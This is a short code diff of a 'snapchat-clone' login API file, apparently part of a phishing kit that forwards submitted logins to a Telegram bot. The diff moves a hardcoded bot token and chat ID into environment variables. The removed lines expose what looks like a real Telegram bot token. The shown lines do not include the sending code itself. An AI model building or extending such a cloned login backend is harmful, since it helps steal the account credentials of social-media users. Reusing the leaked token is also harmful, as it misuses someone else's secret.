@@ -1,11 +1,10 @@
-// File: snapchat-clone/api/login.js (Modified for Instagram message content)
+// File: snapchat-clone/api/login.js
 
-// NOTE: This file is a simplified API endpoint and requires a server environment (like Node.js with Express/Vercel) to function as an API.
-// For a simple static site, you would typically use a service like Formspree or a full backend.
-// Assuming a server environment is set up to route /api/login to this file.
 
-const TELEGRAM_BOT_TOKEN = '8304693249:AAEScgp8PZ7cfo7-V78EgbV7Uy20v2ScaFQ';
-const TELEGRAM_CHAT_ID = '6402487270';
+
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
 
 // This function escapes special characters for Telegram's MarkdownV2.
 const escapeMarkdown = (text) => {
